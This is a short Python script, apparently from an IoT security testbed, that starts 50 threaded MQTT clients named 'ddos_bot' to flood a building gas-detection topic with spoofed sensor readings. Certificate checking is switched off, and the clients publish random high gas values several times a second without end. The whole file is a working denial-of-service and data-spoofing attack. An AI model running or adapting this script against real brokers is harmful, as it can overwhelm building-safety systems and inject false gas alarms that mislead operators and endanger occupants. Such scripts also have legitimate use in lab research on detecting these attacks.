#!/usr/bin/env python3

import os
import time
import json
import ssl
import random
import threading
import paho.mqtt.client as mqtt
from datetime import datetime

# === CONFIG FROM ENVIRONMENT ===
BROKER = os.getenv("BROKER_ADDRESS", "mqtt-broker")
PORT = 8883  # TLS enforced
USERNAME = os.getenv("MQTT_USERNAME", "")
PASSWORD = os.getenv("MQTT_PASSWORD", "")
ENABLE_TLS = True
NUM_CLIENTS = int(os.getenv("NUM_DDOS_CLIENTS", 50))
TOPIC = os.getenv("DDOS_TOPIC", "building/zone3/gas/detection")

# === TLS CONFIGURATION ===


def now():
    return datetime.now().strftime("%d/%b/%y %H:%M:%S")

# === ATTACK FUNCTION PER CLIENT ===
def flood_thread(client_id):
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] {client_id} connected.")
        else:
            print(f"[!] {client_id} failed to connect.")

    client = mqtt.Client(client_id=client_id)
    client.username_pw_set(USERNAME, PASSWORD)

    if ENABLE_TLS:
        client.tls_set(cert_reqs=ssl.CERT_NONE)

    client.on_connect = on_connect

    try:
        client.connect(BROKER, port=PORT)
        client.loop_start()
    except Exception as e:
        print(f"[!] {client_id} connection error: {e}")
        return

    while True:
        payload = {
            "device_id": client_id,
            "sensor": "gas",
            "value": round(random.uniform(100, 1000), 2),
            "timestamp": now()
        }
        try:
            client.publish(TOPIC, json.dumps(payload))
            print(f"[{client_id}] Published payload.")
        except Exception as e:
            print(f"[{client_id}] Publish error: {e}")
        time.sleep(random.uniform(0.1, 0.5))  # rapid fire

# === LAUNCH MULTIPLE THREADS ===
threads = []
for i in range(NUM_CLIENTS):
    cid = f"ddos_bot_{i}"
    t = threading.Thread(target=flood_thread, args=(cid,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
